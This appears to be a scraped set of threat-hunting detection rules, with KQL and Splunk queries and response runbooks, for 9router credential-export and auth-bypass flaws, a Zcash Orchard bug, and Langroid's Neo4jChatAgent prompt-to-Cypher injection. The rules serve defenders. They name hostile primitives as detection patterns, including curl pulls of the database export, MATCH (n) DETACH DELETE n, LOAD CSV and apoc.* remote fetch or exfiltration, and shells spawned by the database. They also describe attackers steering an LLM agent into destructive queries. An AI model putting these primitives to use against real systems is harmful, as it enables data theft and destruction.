9router full database/credential export via GET /api/settings/database (CVE-2026-55500) AIActions on Objectives High
Hunts the credential-theft step of CVE-2026-55500: an authenticated (default-password) GET to /api/settings/database that returns the complete 9router database — plaintext apiKeys, OAuth tokens and OIDC secrets. Catches both the web-tier request (large 200 response body) and the attacker-side curl/PowerShell process pulling the endpoint. Rationale: Uses the article's exact stable IOC — the /api/settings/database export route — plus the >1MB response-body signal that distinguishes a full-DB dump from a normal settings read, and the reproduction command's curl/auth_token pattern for the endpoint side. External corroboration: 9router (vendor decolua) has a documented family of unprotected-admin-API/auth-bypass CVEs. Cross-checked against: • https://github.com/advisories/GHSA-fhh6-4qxv-rpqj • https://www.sentinelone.com/vulnerability-database/cve-2026-10269/
ATT&CKT1552.001 T1213 T1555
Data sourcesWeb.Web
Expected false positives · estimated rate: low — model-assessed, tune to your environment
  • Legitimate admin taking a manual configuration backup via the export endpoint during a maintenance window
  • 9router's own scheduled backup/export job hitting the endpoint from localhost
  • Automated config-management tooling (Ansible/Terraform) reading settings via the API
  • A monitoring/uptime probe issuing GET to the settings path (usually small body, filtered by the >1MB gate)
  • Developer running curl against a local dev instance on port 20128 during testing
Suppression filter
| where not (SrcIpAddr in ("127.0.0.1","::1") and HttpRequestHeaderUserAgent has_any ("9router-backup","node-fetch"))
Response runbook
1) TRIAGE: Confirm the SrcIpAddr/host and account behind the GET — is it an admin from a known jump box during a change window, or an external/unfamiliar IP with a curl/non-browser UA? Check response size (full dump ~ all tables). 2) CONTAIN: Treat every secret in 9router as compromised — rotate all apiKeys, provider OAuth tokens and OIDC client secrets immediately, force-reset the dashboard password, and block the source IP; upgrade 9router past 0.4.71. 3) HUNT: Pivot on the same SrcIpAddr/account for a subsequent POST to /api/settings/database (import/persistence) and for downstream use of the leaked API keys/OAuth tokens across dependent services.
DeviceProcessEvents
| where Timestamp > ago(7d)
| where FileName in~ ("curl.exe","wget.exe","powershell.exe","pwsh.exe")
| where ProcessCommandLine has "/api/settings/database"
| where not (ProcessCommandLine has_any ("-X POST","--data","-d ","--request POST"))   // POST = import, handled separately
| project Timestamp, DeviceName, AccountName, FileName, ProcessCommandLine, InitiatingProcessFileName, InitiatingProcessCommandLine
| order by Timestamp desc
ImWebSession
| where TimeGenerated > ago(7d)
| where HttpMethod =~ "GET"
| where Url has "/api/settings/database"
| where toint(HttpStatusCode) == 200
| where HttpResponseBodyBytes > 1000000   // full DB dump — export returns every table
| project TimeGenerated, SrcIpAddr, DstHostname, DstPortNumber, Url, HttpMethod, HttpStatusCode, HttpResponseBodyBytes, HttpRequestHeaderUserAgent
| order by TimeGenerated desc

9router malicious database import (wipe-and-replace) via POST /api/settings/database (CVE-2026-55500) AIInstallation High
Hunts the takeover/persistence step of CVE-2026-55500: a POST to /api/settings/database that overwrites every table in a single transaction — resetting the password hash and all settings to attacker-controlled values. Fires on the web-tier POST and on the attacker-side curl -X POST -d that carries the crafted database body. Rationale: Anchors on the same stable endpoint /api/settings/database but pivots on the POST verb — the article states the POST path performs a full wipe-and-replace transaction that resets the password hash. curl -X POST -d body from the reproduction steps gives the endpoint-side signature. Cross-checked against: • https://github.com/advisories/GHSA-fhh6-4qxv-rpqj • https://www.sentinelone.com/vulnerability-database/cve-2026-10269/
ATT&CKT1565.001 T1485 T1556
Data sourcesWeb.Web
Expected false positives · estimated rate: low — model-assessed, tune to your environment
  • Admin restoring a legitimate config backup via the import endpoint after maintenance
  • Blue-team/DR restore drills that re-import a known-good database
  • 9router upgrade tooling that migrates settings via a POST to the same route
  • QA/staging automation seeding a test database on a dev instance (port 20128)
  • Config-as-code pipeline pushing settings on deploy
Suppression filter
| where not (SrcIpAddr in ("127.0.0.1","::1") and HttpRequestHeaderUserAgent has_any ("9router-restore","9router-migrate"))
Response runbook
1) TRIAGE: Determine whether the POST correlates with an approved change/restore ticket and originates from an admin jump host; a POST from an external IP or one immediately following a GET export from the same source is high-suspicion. 2) CONTAIN: Isolate the 9router host, snapshot the database for forensics, then restore from a trusted pre-incident backup; force-rotate the dashboard password and all stored secrets since the import may have set an attacker password. 3) HUNT: Look for a successful dashboard login immediately after this POST (attacker-set credentials) and for the preceding GET export from the same SrcIpAddr; audit downstream services for use of tokens that existed before the overwrite.

9router ALWAYS_PROTECTED bypass: auth-denied then success on /api/settings/database (CVE-2026-55500) AIExploitation Medium
Correlation hunt for token forging / middleware bypass against CVE-2026-55500: the same source is denied (401/403) on /api/settings/database and then obtains a 200 within a short window, indicating a successful auth-token guess, forge, or ALWAYS_PROTECTED circumvention rather than a normal authenticated admin. Rationale: Grounded in the article's statement that the endpoint is 'protected' only by the ALWAYS_PROTECTED JWT/CLI-token check; a denied-then-allowed sequence on that exact route from one source is the observable signature of forging/bypassing that check rather than a legitimately logged-in admin (who would 200 on the first try). Cross-checked against: • https://github.com/advisories/GHSA-fhh6-4qxv-rpqj • https://www.sentinelone.com/vulnerability-database/cve-2026-10269/
ATT&CKT1556 T1190
Data sourcesWeb.Web
Expected false positives · estimated rate: medium — model-assessed, tune to your environment
  • Admin whose session/JWT expired (401), who re-authenticates and retries successfully
  • Automation with a stale cached token that refreshes and retries within the hour
  • Load balancer / proxy health probe hitting the route before auth cookie is set
  • Browser pre-flight or SSO redirect flow producing a transient 401 then 200
  • Password-manager autofill retry after an initial failed submit
Suppression filter
| where DeltaSec < 120 and Denied >= 3   // keep only tight, repeated-denial-then-success bursts; drop lone expiry/refresh
Response runbook
1) TRIAGE: Inspect the denied requests' Authorization/cookie shape and the delta to success — many rapid 401/403 (token brute/forge) before a 200 is far more suspicious than a single expiry-and-refresh. Confirm the SrcIpAddr is not a known admin/automation. 2) CONTAIN: Invalidate all active dashboard sessions/CLI tokens, force credential rotation, and restrict the endpoint to an allow-listed management network; patch 9router past 0.4.71. 3) HUNT: For any source that crossed the bypass threshold, pull its subsequent GET (export) and POST (import) activity on /api/settings/database and correlate with new admin logins.
ImWebSession
| where TimeGenerated > ago(7d)
| where Url has "/api/settings/database"
| extend Status = toint(HttpStatusCode)
| summarize Denied = countif(Status in (401,403)),
            Success = countif(Status == 200),
            FirstDenied = minif(TimeGenerated, Status in (401,403)),
            FirstSuccess = minif(TimeGenerated, Status == 200)
            by SrcIpAddr, bin(TimeGenerated, 1h)
| where Denied > 0 and Success > 0 and FirstSuccess > FirstDenied   // rejected first, then let in = bypass/forge
| project SrcIpAddr, WindowStart = bin_at(FirstDenied, 1h, FirstDenied), Denied, Success, FirstDenied, FirstSuccess, DeltaSec = datetime_diff('second', FirstSuccess, FirstDenied)
| order by FirstSuccess desc
WEB
Toggle if your env has no CIM data-model acceleration.
| tstats summariesonly=t count min(_time) as firstTime max(_time) as lastTime from datamodel=Web where Web.url="*/api/settings/database*" by Web.src Web.status _time span=1h | `drop_dm_object_name(Web)` | eval denied=if(status="401" OR status="403",count,0), success=if(status="200",count,0) | stats sum(denied) as denied sum(success) as success min(firstTime) as firstTime max(lastTime) as lastTime by src _time | where denied>0 AND success>0 | `security_content_ctime(firstTime)` | `security_content_ctime(lastTime)`
| tstats summariesonly=false count min(_time) as firstTime max(_time) as lastTime from datamodel=Web where Web.url="*/api/settings/database*" by Web.src Web.status _time span=1h | `drop_dm_object_name(Web)` | eval denied=if(status="401" OR status="403",count,0), success=if(status="200",count,0) | stats sum(denied) as denied sum(success) as success min(firstTime) as firstTime max(lastTime) as lastTime by src _time | where denied>0 AND success>0 | `security_content_ctime(firstTime)` | `security_content_ctime(lastTime)`
9router /api/settings/database endpoint enumeration / scanning (CVE-2026-55500) AIReconnaissance Medium
Pre-exploitation discovery hunt for CVE-2026-55500: a single source making an abnormal volume of requests to /api/settings/database — typically HEAD/OPTIONS/GET returning 401/403/404 while probing for an exposed, unpatched 9router instance before attempting the credential export. Rationale: Uses the article-established attack surface (the /api/settings/database route) as the scan target and a per-source volume threshold on a route that legitimate admins touch only occasionally, surfacing enumeration/mass-scanning before the actual export/import. Cross-checked against: • https://github.com/advisories/GHSA-fhh6-4qxv-rpqj • https://www.sentinelone.com/vulnerability-database/cve-2026-10269/
ATT&CKT1595.002 T1590
Data sourcesWeb.Web

  • Authorized vulnerability scanner (Nessus/Qualys/Nuclei) sweeping the estate for CVE-2026-55500
  • Uptime/synthetic monitoring polling the settings route on a tight interval

Zcash node exposed to Orchard soundness bug (CVE-2026-54496) present in vuln inventory AIExploitation High
Flags any managed host whose Defender TVM vulnerability feed reports CVE-2026-54496 (the halo2_gadgets missing-copy-constraint Orchard soundness flaw). This is the only SOC-detectable surface for this bug: exploitation itself is undetectable on-chain, so we hunt exposure — unpatched zebrad/zcashd/orchard/zcash_primitives/halo2_gadgets that could run a vulnerable Orchard verifier or prover. Rationale: Uses the exact CVE id (CVE-2026-54496) named in the GHSA advisory; this is deterministic vuln-inventory matching, not behavioral inference, because the article states exploitation leaves no on-chain or telemetry signature. Version boundaries corroborated against the Zcash Foundation NU6.2 / Zebra 5.0.0 advisory. Cross-checked against: • https://github.com/advisories/GHSA-ww9q-8r59-xv46 • https://zfnd.org/zebra-4-5-3-and-5-0-0-emergency-soft-fork-and-nu6-2-activation/ • https://blocksec.com/blog/web3-security-zcash-orchard-soundness-bug-analysis
ATT&CKT1190
Data sourcesVulnerabilities.Vulnerabilities
Expected false positives · estimated rate: low — model-assessed, tune to your environment
  • Node already upgraded to zebrad 5.0.0 / zcashd 6.20.0 but TVM inventory is stale and not yet rescanned, so the CVE still shows as open.
  • Host running halo2_gadgets < 0.5.0 as a transitive dependency of an unrelated (non-Orchard) zk application — vulnerable crate present but no Orchard verifier actually instantiated.
  • Air-gapped or offline validator whose remediation (hard-fork verifying-key swap) was applied out-of-band and TVM cannot see the running verifying-key routing.
  • Internal fork of zcashd/zebrad carrying a backported copy_advice fix but still reporting a pre-patch version string.
  • Duplicate finding across CI build agents that merely compiled the crate but never ran a consensus node.
Suppression filter
| where TimeGenerated > ago(7d)  // drop stale-inventory rows so freshly-patched nodes stop firing
Response runbook
1) TRIAGE: Confirm the host's role — is it a validating full node / mining node exposed to the Zcash P2P network, or just a workstation with the crate as a build artifact? Internet-facing consensus nodes are top priority. 2) CONTAIN: Upgrade to zebrad 5.0.0 (or apply the 4.5.3 interim soft-fork) / zcashd 6.20.0 and confirm NU6.2 activation so Orchard proofs route to the FixedPostNu6_2 verifying key; if it cannot be patched immediately, disable Orchard actions or isolate the node from consensus. 3) HUNT: Inventory every host and CI/build pipeline importing halo2_gadgets < 0.5.0, orchard < 0.14.0, or zcash_primitives < 0.28.0; grep repo Cargo.lock files for pinned pre-patch versions.

Unpatched Zcash Orchard packages by version (zebrad/zcashd/orchard/zcash_primitives/halo2_gadgets) AIExploitation High
Direct version-string comparison against the patched releases named in the advisory, independent of whether the vendor CVE KB has ingested CVE-2026-54496 yet. Catches the niche Rust crates (halo2_gadgets, orchard, zcash_primitives) that a CVE-feed-keyed rule will likely miss, and any node still below the NU6.2 fix line. Rationale: Uses the exact affected/patched version boundaries listed verbatim in the advisory (halo2_gadgets<0.5.0, orchard<0.14.0, zcash_primitives<0.28.0, zcashd<6.20.0, zebrad<5.0.0) with parse_version for correct semver ordering; resilient to KB-ingestion lag and to the fact that Rust crates are rarely tracked by CVE feeds. Sentinel left empty because DeviceTvmSoftwareInventory is not exposed in this tenant's Sentinel schema (only DeviceTvmSoftwareVulnerabilities is) — the CVE-keyed UC covers Sentinel instead; Splunk/Datadog/Falcon/CloudWatch have no equivalent crate-level software-inventory telemetry. Cross-checked against: • https://github.com/advisories/GHSA-ww9q-8r59-xv46 • https://zfnd.org/zebra-4-5-3-and-5-0-0-emergency-soft-fork-and-nu6-2-activation/
ATT&CKT1190
Data sources
Expected false positives · estimated rate: low — model-assessed, tune to your environment
  • Development/nightly build reporting a non-semver version string (e.g. git-hash suffix) that parse_version cannot order — should be reviewed, not auto-closed.
  • halo2_gadgets < 0.5.0 pulled transitively by a non-Zcash zk project that never instantiates the Orchard variable-base-mul gadget.
  • Node exactly at the patched boundary (zebrad 5.0.0 / zcashd 6.20.0) correctly excluded by the strict less-than comparison — verify it does not fire.
  • Vendored/renamed internal copy of the crate carrying a backported copy_advice fix while still stamped with an old version.
  • Test harness that compiled the vulnerable crate for regression testing but does not run a live consensus node.
Suppression filter
| where SoftwareVersion matches regex @"^\d+\.\d+\.\d+$"  // drop non-semver/nightly strings parse_version cannot reliably order
Response runbook
1) TRIAGE: Determine whether the flagged package backs a live Orchard prover/verifier (running zebrad/zcashd consensus node) or is an inert build dependency; prioritize internet-facing nodes. 2) CONTAIN: Bump zebrad to 5.0.0 / zcashd to 6.20.0 (or crates to halo2_gadgets 0.5.0, orchard 0.14.0, zcash_primitives 0.28.0), rebuild, and confirm NU6.2 verifying-key routing (FixedPostNu6_2); isolate nodes that cannot be patched. 3) HUNT: Sweep source repos and Cargo.lock files org-wide for pinned pre-patch versions and pin them forward; verify no wallet-linked software importing the crate was compromised (the theft variant requires a compromised software wallet holding the incoming viewing key).

Langroid Neo4jChatAgent: dangerous LLM-generated Cypher in Neo4j query.log (apoc.*/dbms.*/LOAD CSV/DETACH DELETE) AIExploitation Medium
Hunts the Neo4j query log (query.log shipped via Syslog) for the exact unrestricted Cypher primitives an attacker steers through Langroid's unvalidated Neo4jChatAgent (CVE-2026-55615): whole-graph destruction (MATCH (n) DETACH DELETE n), LOAD CSV remote fetch, and the code-execution ceiling procedures CALL apoc.* / apoc.load/export/import / apoc.cypher.runFile / CALL dbms.*. This is the direct on-the-wire artifact of the prompt-to-Cypher injection the SQLChatAgent validator (CVE-2026-25879) blocks but the neo4j module did not until 0.65.5. Rationale: Uses the exact sink strings the advisory names as unrestricted on the Cypher path (MATCH (n) DETACH DELETE n at neo4j_chat_agent.py:287-293; LOAD CSV, apoc.load/export/import, apoc.cypher.runFile, CALL dbms.* as the RCE ceiling). Neo4j's own SSRF KB and the Cypher-injection cheat sheet confirm these are the real read/destroy/SSRF/filesystem primitives, so a query.log line carrying them from an LLM-driven agent is high-fidelity. Cross-checked against: • https://neo4j.com/developer/kb/protecting-against-ssrf/ • https://pentester.land/blog/cypher-injection-cheatsheet/ • https://github.com/langroid/langroid/security/advisories/GHSA-mxfr-6hcw-j9rq
ATT&CKT1190 T1485 T1059
Data sources
Expected false positives · estimated rate: medium — model-assessed, tune to your environment
  • Sanctioned ETL/data-load jobs legitimately running LOAD CSV against trusted feeds
  • DBA/backup automation calling apoc.export.csv.* or apoc.import.* on a schedule
  • Scheduled graph-cleanup jobs issuing MATCH (n) DETACH DELETE n against a scratch database
  • apoc.periodic / apoc.meta maintenance procedures invoked by the application itself
  • Developer running admin dbms.* procedures during troubleshooting from an interactive cypher-shell session
Suppression filter
| where not (ProcessName has "cypher-shell") and not (SyslogMessage has "apoc.periodic" or SyslogMessage has "apoc.meta")
Response runbook
1) TRIAGE: pull the full query.log line and the surrounding session; confirm the query originated from the Langroid agent's DB service account (not cypher-shell/DBA) and check whether the tenant is on langroid <=0.65.4 (vulnerable). Look for LOAD CSV/apoc.load URLs pointing off-net or apoc.export writing to unexpected paths. 2) CONTAIN: rotate the Neo4j role the agent uses to a least-privilege read-only role, disable APOC file/network procedures in neo4j.conf (dbms.security.procedures.allowlist), and upgrade langroid to 0.65.5 which adds allow_dangerous_operations=False. 3) HUNT: pivot to UC on Neo4j-JVM outbound egress for the same time window to see if a LOAD CSV/apoc.load SSRF actually fetched or exfiltrated, and review app logs / RAG-ingested content for the injection source string.
Syslog
| where TimeGenerated > ago(7d)
| where ProcessName has "neo4j" or SyslogMessage has "neo4j" or SyslogMessage has_cs "MATCH" or SyslogMessage has "apoc."
| where SyslogMessage has_any ("DETACH DELETE", "LOAD CSV", "CALL apoc.", "apoc.load", "apoc.export", "apoc.import", "apoc.cypher.runFile", "CALL dbms.", "dbms.security", "CALL db.index")
| extend DangerOp = extract(@"(?i)(DETACH\s+DELETE|LOAD\s+CSV|apoc\.[a-z.]+|dbms\.[a-z.]+)", 1, SyslogMessage)
| project TimeGenerated, Computer, ProcessName, DangerOp, SyslogMessage
| order by TimeGenerated desc
source:(linux.syslog OR linux.auditd) @process.name:(*neo4j* OR *java*) ("DETACH DELETE" OR "detach delete" OR "LOAD CSV" OR "load csv" OR "CALL apoc." OR apoc.load OR apoc.export OR apoc.import OR apoc.cypher.runFile OR "CALL dbms.")
APPLICATION
index=* (sourcetype="neo4j:query" OR source="*/logs/query.log" OR source="*query.log")
| where match(_raw, "(?i)(DETACH\s+DELETE|LOAD\s+CSV|CALL\s+apoc\.|apoc\.(load|export|import)\.|apoc\.cypher\.runFile|CALL\s+dbms\.|CALL\s+db\.index)")
| rex field=_raw "(?i)(?<danger_op>DETACH\s+DELETE|LOAD\s+CSV|apoc\.[a-z.]+|dbms\.[a-z.]+)"
| stats count min(_time) as firstTime max(_time) as lastTime values(danger_op) as danger_ops by host source
| convert ctime(firstTime) ctime(lastTime)
| sort - count
Neo4j JVM first-seen outbound fetch to public host (LOAD CSV / apoc.load SSRF + apoc.export exfil) AIActions on Objectives Medium
Hunts the Neo4j database server process (java running org.neo4j) making a first-time outbound connection to a public destination - the observable side-effect of attacker-steered LOAD CSV remote fetch, apoc.load.json/xml (SSRF) or apoc.export exfiltration driven through the unvalidated Neo4jChatAgent. This is the non-contingent 'floor' primitive of CVE-2026-55615: present even without APOC for LOAD CSV, and the exfil path when APOC is enabled. Rationale: Scopes to the Neo4j server process (JVM whose command line contains 'neo4j') reaching a first-seen public host - the exact behaviour LOAD CSV remote fetch and apoc.load.*/apoc.export.* produce. Neo4j's SSRF KB confirms LOAD CSV and APOC HTTP procedures egress to attacker-chosen URLs, making a graph DB's unexpected outbound fetch a high-signal exfil/SSRF indicator; first-seen baselining strips routine trusted imports. Cross-checked against: • https://neo4j.com/developer/kb/protecting-against-ssrf/ • https://pentester.land/blog/cypher-injection-cheatsheet/
ATT&CKT1071.001 T1567 T1213
Data sourcesNetwork_Traffic.All_Traffic
Expected false positives · estimated rate: medium — model-assessed, tune to your environment
  • Legitimate LOAD CSV importing a dataset from a trusted external URL for the first time
  • apoc.load.json/xml calls to a sanctioned partner API the app newly integrated
  • Neo4j / APOC plugin version-update or license check to neo4j.com (mostly stripped by the RemoteUrl filter)
  • A co-located monitoring/APM agent sharing the same JVM command line reaching a SaaS endpoint
  • Backup tooling exporting to a cloud object-store endpoint via apoc.export
Suppression filter
| where RemoteUrl !has "amazonaws.com" and RemoteUrl !has "blob.core.windows.net" and RemotePort in (80, 443, 21)
Response runbook
1) TRIAGE: resolve the RemoteIP/RemoteUrl and check reputation; confirm the initiating process is the Neo4j server JVM and correlate the timestamp against the Neo4j query.log (UC1) to see which LOAD CSV/apoc.load statement caused it. 2) CONTAIN: block the destination at egress, apply Neo4j's IP-level SSRF allowlist (dbms.security.procedures / LOAD CSV allowlist), rotate the agent's DB role to read-only, and upgrade langroid to 0.65.5. 3) HUNT: search apoc.export writes to disk and subsequent uploads on the same host, and review whether the destination was reached from any other internal service (pivot to lateral SSRF).

Neo4j server JVM spawning OS shell (APOC/dbms Cypher-to-RCE landing) AIExploitation High
Hunts the Neo4j database server process (java whose command line contains 'neo4j', or neo4j.exe) spawning a command interpreter (cmd/powershell/sh/bash) - the RCE ceiling of CVE-2026-55615 when APOC / dbms.security procedures are granted to the DB role, i.e. the Cypher analogue of the parent CVE-2026-25879 'COPY ... FROM PROGRAM' RCE. A graph database process launching a shell is anomalous by design and indicates an attacker-steered apoc.* / dbms.* procedure achieved OS-command execution. Rationale: Encodes the advisory's stated RCE ceiling: when APOC/dbms.security procedures are enabled, attacker-steered Cypher (apoc.cypher.runFile, dbms.*) achieves OS-command execution on the DB host - observable as the Neo4j JVM (parent cmdline contains 'neo4j') spawning a shell. Neo4j never legitimately spawns cmd/powershell/sh at runtime, and the advisory explicitly parallels the parent CVE-2026-25879 COPY FROM PROGRAM RCE, making this a low-FP, high-confidence pivot. Cross-checked against: • https://github.com/advisories/GHSA-2pq5-3q89-j7cc • https://www.thehackerwire.com/langroid-sqlchatagent-rce-via-prompt-injection-cve-2026-25879/ • https://neo4j.com/developer/kb/protecting-against-ssrf/
ATT&CKT1190 T1059.001 T1059.004
Data sourcesEndpoint.Processes
Expected false positives · estimated rate: low — model-assessed, tune to your environment
  • Neo4j Docker/entrypoint wrapper scripts that shell out at container start (parent cmdline still contains 'neo4j')
  • APOC-based housekeeping that legitimately calls apoc.systemCommand in a sanctioned automation
  • Admin running neo4j-admin backup/restore which may fork a shell
  • Monitoring/APM agent injected into the JVM invoking a helper shell
  • Config-management (Ansible/Chef) executing under the neo4j service account during deploy
Suppression filter
| where ProcessCommandLine !has "neo4j-admin" and InitiatingProcessCommandLine !has "docker-entrypoint" and ProcessCommandLine !has "apoc.systemCommand"
Response runbook
1) TRIAGE: capture the child ProcessCommandLine and full process tree; a shell with recon/download/reverse-shell args under the Neo4j JVM is a confirmed RCE - benign hits are container-init or backup wrappers. Correlate to the query.log UC for the apoc.*/dbms.* statement that triggered it. 2) CONTAIN: isolate the host, kill the child process chain, disable APOC/system procedures (dbms.security.procedures.allowlist / unrestricted=none) in neo4j.conf, rotate the agent DB role to least-privilege read-only, and upgrade langroid to 0.65.5. 3) HUNT: sweep for persistence and secondary payloads dropped by the shell (FileWritten on the host), outbound C2 from the Neo4j JVM, and any credential/graph-data access in the same session.
DeviceProcessEvents
| where Timestamp > ago(7d)
| where InitiatingProcessCommandLine has "neo4j"        // Neo4j JVM (java -cp ... org.neo4j.server) or neo4j service
| where FileName in~ ("cmd.exe","powershell.exe","pwsh.exe","wscript.exe","cscript.exe","bash","bash.exe","sh","sh.exe","dash","curl","curl.exe","wget")
| project Timestamp, DeviceName, AccountName, InitiatingProcessFileName, InitiatingProcessCommandLine, FileName, ProcessCommandLine, SHA256
| order by Timestamp desc
SecurityEvent
| where TimeGenerated > ago(7d)
| where EventID == 4688
| where ParentProcessName endswith "\\java.exe" or ParentProcessName has "neo4j"
| where NewProcessName has_any ("\\cmd.exe","\\powershell.exe","\\pwsh.exe","\\wscript.exe","\\cscript.exe","\\bash.exe","\\sh.exe")
| project TimeGenerated, Computer, Account, ParentProcessName, NewProcessName, CommandLine
| order by TimeGenerated desc

Vulnerable Langroid package present (<=0.65.4) - Neo4jChatAgent unvalidated Cypher (CVE-2026-55615) AIExploitation High
Surfaces hosts running a Langroid version affected by CVE-2026-55615 (pip:langroid <= 0.65.4), where Neo4jChatAgent executes LLM-generated Cypher with no validation, no statement-type allowlist and no opt-out gate. This is the exploitable precondition: the fix (allow_dangerous_operations default False) only lands in 0.65.5, so any earlier version co-located with a Neo4j/APOC deployment is the attack surface. Rationale: Pins the exact affected-package range the advisory states (pip:langroid vuln <= 0.65.4, fixed 0.65.5) and the assigned CVE-2026-55615. Version-inventory / TVM is the only telemetry that expresses the 'no opt-out gate' precondition reviewer feedback asked for; parse_version gives an exact, hand-edit-free version comparison. Cross-checked against: • https://github.com/advisories/GHSA-2pq5-3q89-j7cc • https://advisories.gitlab.com/pypi/langroid/CVE-2026-25879/
ATT&CKT1190 T1059
Data sources
Expected false positives · estimated rate: low — model-assessed, tune to your environment
  • Developer workstation with an old langroid in a venv that never connects to a live Neo4j (exploitable surface absent)
  • A pinned old langroid used only with SQLChatAgent/other agents, not Neo4jChatAgent
  • CI build agent that transiently installs langroid for tests
  • Air-gapped analytics host where the agent prompt is not attacker-influenceable
  • Vendored/forked copy already carrying the 0.65.5 validation backported despite reporting an older version string
Response runbook
1) TRIAGE: for each host confirm whether Neo4jChatAgent is actually instantiated and pointed at a live Neo4j (grep app config for Neo4jChatAgentConfig / bolt:// URIs) and whether APOC/dbms procedures are granted to that DB role - that distinguishes real exposure from a dormant dependency. 2) CONTAIN: upgrade langroid to >=0.65.5 (or set allow_dangerous_operations=False and restrict the Neo4j role to read-only) and disable APOC file/network procedures. 3) HUNT: on exposed hosts, run the query.log dangerous-Cypher UC and the Neo4j-JVM egress/shell UCs over the retention window to confirm no prior exploitation occurred.
DeviceTvmSoftwareInventory
| where Timestamp > ago(1d)
| where SoftwareName has "langroid"
| extend Ver = parse_version(SoftwareVersion)
| where Ver < parse_version("0.65.5")
| project Timestamp, DeviceName, SoftwareVendor, SoftwareName, SoftwareVersion, EndOfSupportStatus
| order by DeviceName asc
DeviceTvmSoftwareVulnerabilities
| where TimeGenerated > ago(1d)
| where CveId =~ "CVE-2026-55615" or (SoftwareName has "langroid" and not(SoftwareVersion startswith "0.65.5") and not(SoftwareVersion startswith "0.66") and not(SoftwareVersion startswith "0.7"))
| project TimeGenerated, DeviceName, SoftwareVendor, SoftwareName, SoftwareVersion, CveId, RecommendedSecurityUpdate
| order by DeviceName asc

  • CI smoke test hitting multiple API routes post-deploy
Suppression filter
| where SrcIpAddr !in ("10.0.0.0/8 internal-monitor-ranges")  // replace with your health-check / AppSec scanner source IPs once identified
Response runbook
1) Triage: pull all requests from the offending SrcIpAddr in the window; is it an internal admin/monitor IP or external/unknown? Check whether requests carried a session cookie/Authorization header (unauthenticated = no creds). 2) Contain: block the source IP at the WAF/reverse proxy and put /api/providers and /api/usage/* behind auth or a network ACL; confirm the 9router instance is upgraded to >=0.4.45. 3) Hunt: pivot the same src to the mutation and key-leak UCs below — look for follow-on POST/PUT/DELETE /api/providers and GET /api/usage/stats returning 200.

Unauthenticated 9router provider CRUD mutation (rogue-provider / key-swap / DoS) AIActions on Objectives High
Hunts POST/PUT/DELETE requests to /api/providers or /api/providers/:id — the missing-auth mutation path that lets any client inject an attacker-controlled provider (proxying prompts/keys), overwrite an existing provider's API key, or delete all providers for denial of service. Article-specific to the CRUD endpoints in GHSA-vjc7-jrh9-9j86 which require zero authentication. Rationale: POST/PUT/DELETE to /api/providers is a direct match for the missing-auth CRUD in the advisory; because the endpoint requires no auth, ANY mutation from an unexpected source is high-fidelity (inject rogue provider with attacker apiKey, swap sk-* key, or delete for DoS). Cross-checked against: • https://github.com/advisories/GHSA-vjc7-jrh9-9j86 • https://github.com/decolua/9router/issues/431 • https://advisories.gitlab.com/npm/9router/GHSA-g6g7-pvmx-m74p/
ATT&CKT1565.001 T1098.003
Data sourcesWeb.All_Traffic
Expected false positives · estimated rate: low — model-assessed, tune to your environment
  • Legitimate admin adding/editing/removing a provider connection via the dashboard UI (which calls the same routes)
  • Automated provisioning/IaC script that seeds provider configs on deploy
  • Internal migration job re-writing provider entries during an upgrade to 0.4.45
Suppression filter
| where HttpMethod == "DELETE" or SrcIpAddr !in ("<known-admin-workstation-IPs>")  // start with DELETE (never a benign bulk op) then add admin-source allowlist
Response runbook
1) Triage: inspect the request body/UA and source IP — was there a preceding authenticated dashboard session from the same client, or is it a raw curl/unknown UA? DELETE with no prior admin login = malicious. Pull the created/modified provider's name and apiKey prefix from app logs. 2) Contain: revoke/rotate any provider API keys that could have been swapped or exfiltrated, remove attacker-injected provider entries, block the source, and gate /api/providers/* behind auth; upgrade to >=0.4.45. 3) Hunt: check /api/usage/stats reads (key leak) from the same src, and outbound traffic from the 9router host to any newly-added provider endpoint (prompt/response proxying).
ImWebSession
| where TimeGenerated > ago(1d)
| extend UrlPath = tostring(parse_url(Url).Path)
| where UrlPath startswith "/api/providers"
| where HttpMethod in ("POST","PUT","DELETE")
| extend Status = toint(HttpStatusCode)
| project TimeGenerated, SrcIpAddr, HttpHostName, HttpMethod, UrlPath, Status, HttpRequestBodyBytes, HttpRequestHeaderUserAgent
| order by TimeGenerated desc

9router API-key leak via unauthenticated GET /api/usage/stats and /api/usage/request-logs AIActions on Objectives High
Hunts successful GET requests to /api/usage/stats (returns full plaintext sk- API keys, per-account cost data) and /api/usage/request-logs (all users' request history incl. emails) — the unauthenticated credential-exposure endpoints in the advisory. Any 200 here means secrets were served without auth. Rationale: /api/usage/stats returning 200 literally serves plaintext sk- keys and per-key cost data per the advisory, and /api/usage/request-logs serves all users' history with emails — both are named unauthenticated endpoints, so a successful GET is a confirmed secret disclosure, not just an attempt. Cross-checked against: • https://github.com/advisories/GHSA-vjc7-jrh9-9j86 • https://github.com/decolua/9router/issues/431
ATT&CKT1528 T1552.001
Data sourcesWeb.All_Traffic
Expected false positives · estimated rate: low — model-assessed, tune to your environment
  • Authenticated admin opening the 9router usage/billing dashboard which fetches these endpoints
  • Internal billing/reporting exporter scraping usage stats on a schedule
  • Monitoring probe validating the endpoint is up
Suppression filter
| where SrcIpAddr !in ("<admin-and-billing-exporter-IPs>")
Response runbook
1) Triage: identify SrcIpAddr and whether the request was authenticated; if external/unknown, treat every sk- key and OAuth token stored in that 9router instance as compromised. Correlate response byte-size — larger bodies = full key dump. 2) Contain: immediately rotate ALL provider API keys (OpenAI sk-, GitHub Copilot OAuth tokens, Cloudflare account creds) referenced by the instance, block the source, gate /api/usage/* behind auth, upgrade to >=0.4.45. 3) Hunt: search external AI-provider billing/usage for anomalous calls using the leaked keys; check for concurrent /api/usage/request-details enumeration (conversation exfil) from the same src.
ImWebSession
| where TimeGenerated > ago(1d)
| extend UrlPath = tostring(parse_url(Url).Path)
| where UrlPath in ("/api/usage/stats","/api/usage/request-logs")
| where HttpMethod == "GET"
| extend Status = toint(HttpStatusCode)
| where Status == 200
| project TimeGenerated, SrcIpAddr, HttpHostName, UrlPath, Status, HttpResponseBodyBytes, HttpRequestHeaderUserAgent
| order by TimeGenerated desc

Bulk enumeration of 9router /api/usage/request-details (conversation-history exfiltration) AIActions on Objectives Medium
